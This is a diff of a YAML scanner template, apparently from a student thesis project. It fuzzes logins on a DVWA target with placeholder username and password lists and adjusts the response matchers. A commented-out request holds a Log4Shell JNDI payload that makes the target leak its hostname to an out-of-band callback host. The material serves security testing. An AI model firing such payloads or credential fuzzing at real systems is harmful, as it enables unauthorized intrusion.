@@ -21,8 +21,9 @@ info:
 requests:
   - request:
       - |
-        GET /test.html HTTP/1.1
+        GET /dvwa?user={{users}}&pass={{passwords}} HTTP/1.1
         Host: {{Hostname}}
+        User-Agent: {{users}}{{passwords}}
 #      - |
 #        GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
 #        Host: {{Hostname}}
@@ -63,10 +64,20 @@ requests:
          username={{users}}{{Port}}&passwd={{passwords}}
 
     payloads:
-      users: D:\Injection-Tool\template\fuzzing\users.txt
-      passwords: D:\Injection-Tool\template\fuzzing\passwords.txt
+#      users: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
+#      passwords: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
 #      users: /mnt/d/FPT LEARNING/Graduation Thesis/Scanner/Injection-Tool/template/fuzzing/users.txt
 #      passwords: /mnt/d/FPT LEARNING/Graduation Thesis/Scanner/Injection-Tool/template/fuzzing/passwords.txt
+      users:
+        - user1
+        - user2
+        - user3
+        - user4
+      passwords:
+        - pass1
+        - pass2
+        - pass3
+        - pass4
 #      Hostname: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\users.txt
 #      Scheme: D:\FPT LEARNING\Graduation Thesis\Scanner\Injection-Tool\template\fuzzing\passwords.txt
     redirect: true
@@ -87,19 +98,22 @@ requests:
 #        regex:
 #          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
 #          -
-#      - type: word
-#        word:
-#          - "status: NOERRORR"
-#        condition: and
-#        negative: false
-#        part: interactsh_response
+      - type: status
+        status:
+          - 404
+        condition: or
+        negative: false
 
       - type: word
         word:
-#          - CORS POC Exploit
-          - "The requested URL was not found on this server"
-        part: body_1
-#        condition: or
+#          - dns
+          - <div id="main_menu_padded">
+          - The requested URL was not found on this server
+        part: all
+        condition: or
+#      - type: time
+#        time:
+#          - ">0.01"
     extractors:
       - type: kval
         kval:
